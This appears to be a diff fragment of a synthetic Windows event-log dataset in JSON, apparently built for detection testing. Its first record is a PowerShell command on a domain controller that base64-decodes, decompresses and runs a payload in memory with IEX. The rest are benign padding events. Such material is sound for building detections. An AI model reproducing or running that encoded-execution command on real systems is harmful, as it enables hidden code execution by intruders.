+  {"Timestamp":"2024-11-18T07:55:00.000Z","EventID":1,"HostName":"CORP-DC01","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(H4sIAAAAAAA...));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Dec","UserName":"ACME\\svc_sql"},
+
+  {"_comment":"=== BLOCK 18: EXTRA benign padding for realistic signal-to-noise ratio ==="},
+
+  {"Timestamp":"2024-11-18T08:30:00.000Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-WS10","UserName":"NT AUTHORITY\\SYSTEM","LogonType":"5"},
+  {"Timestamp":"2024-11-18T08:30:00.100Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"PROD-WEB01","UserName":"NT AUTHORITY\\SYSTEM","LogonType":"5"},
+  {"Timestamp":"2024-11-18T08:30:00.200Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"CORP-DC01","UserName":"NT AUTHORITY\\SYSTEM","LogonType":"5"},
+  {"Timestamp":"2024-11-18T08:31:00.000Z","EventID":1,"HostName":"CORP-WS10","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","CommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --field-trial-handle=1332","UserName":"ACME\\d.kim"},
+  {"Timestamp":"2024-11-18T08:32:00.000Z","EventID":3,"HostName":"CORP-WS10","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","SourceIp":"172.16.10.110","DestinationIp":"142.250.185.206","DestinationPort":"443","Protocol":"tcp"},
+  {"Timestamp":"2024-11-18T08:33:00.000Z","EventID":1,"HostName":"PROD-WEB01","Image":"C:\\Windows\\System32\\w3wp.exe","CommandLine":"c:\\windows\\system32\\inetsrv\\w3wp.exe -ap \"DefaultAppPool\" -v \"v4.0\" -l \"webengine4.dll\"","UserName":"IIS APPPOOL\\DefaultAppPool"},
+  {"Timestamp":"2024-11-18T08:34:00.000Z","EventID":3,"HostName":"PROD-WEB01","Image":"C:\\Windows\\System32\\w3wp.exe","SourceIp":"172.16.5.11","DestinationIp":"172.16.5.25","DestinationPort":"1433","Protocol":"tcp"},
+  {"Timestamp":"2024-11-18T08:35:00.000Z","EventID":4634,"HostName":"CORP-WS11","UserName":"ACME\\s.park"}
+]
